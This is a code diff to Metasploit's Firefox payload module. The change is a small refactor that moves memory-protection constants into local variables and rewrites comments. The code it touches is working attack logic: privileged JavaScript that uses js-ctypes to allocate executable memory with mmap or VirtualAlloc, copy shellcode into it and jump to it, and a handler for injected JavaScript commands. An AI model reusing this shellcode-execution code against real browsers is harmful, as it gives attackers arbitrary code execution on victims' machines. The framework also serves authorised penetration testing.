@@ -22,14 +22,6 @@ module Msf::Payload::Firefox
   def exec_shellcode_source
     %Q|
       var execShellcode = function(shellcode) {
-        var POSIX = {
-          RWX: 7,
-          ANON_PRIVATE: 4098
-        };
-        var WIN = {
-          RWX: 0x40,
-          ANON_PRIVATE: 0x1000
-        };
         var LIBS = [
           "C:\\\\WINDOWS\\\\system32\\\\user32.dll",
           "/usr/lib/libSystem.B.dylib",
@@ -52,6 +44,7 @@ module Msf::Payload::Firefox
         if (!lib) throw new Error("Could not find lib in ["+LIBS+"]");
 
         var execPosix = function() {
+          var RWX = 7, ANON_PRIVATE = 4098;
           var mmap = lib.declare('mmap',
             ctypes.default_abi,   /* calling convention */
             ctypes.voidptr_t,     /* return type */
@@ -69,15 +62,16 @@ module Msf::Payload::Firefox
             ctypes.voidptr_t,     /* src */
             ctypes.size_t         /* size to copy */
           );
-          var buff = mmap(null, shellcode.length, POSIX.RWX, POSIX.ANON_PRIVATE, 0, 0);
+          var buff = mmap(null, shellcode.length, RWX, ANON_PRIVATE, 0, 0);
           memcpy(buff, ctypes.jschar.array()(shellcode), shellcode.length);
-          // there is probably a better way to do this
+          /* there is probably a better way to do this */
           var m = buff.toString().match(/"0x([0-9a-fA-F]*)"/);
           if (!m) throw new Error("Could not find address of buffer.");
           ctypes.FunctionType(ctypes.default_abi, ctypes.int).ptr(parseInt(m[1], 16))();
         };
 
         var execWindows = function() {
+          var RWX = 0x40, ANON_PRIVATE = 0x1000;
           var VirtualAlloc = lib.declare('VirtualAlloc',
             ctypes.winapi_abi,    /* calling convention */
             ctypes.voidptr_t,     /* return type */
@@ -182,7 +176,7 @@ module Msf::Payload::Firefox
         var js = (/^\\s*\\[JAVASCRIPT\\]([\\s\\S]*)\\[\\/JAVASCRIPT\\]/g).exec(cmd.trim());
         if (js) {
           var tag = "[!JAVASCRIPT]";
-          var sync = true;  // avoid zalgo's reach
+          var sync = true;  /* avoid zalgo's reach */
           var sent = false;
           var retVal = null;
 
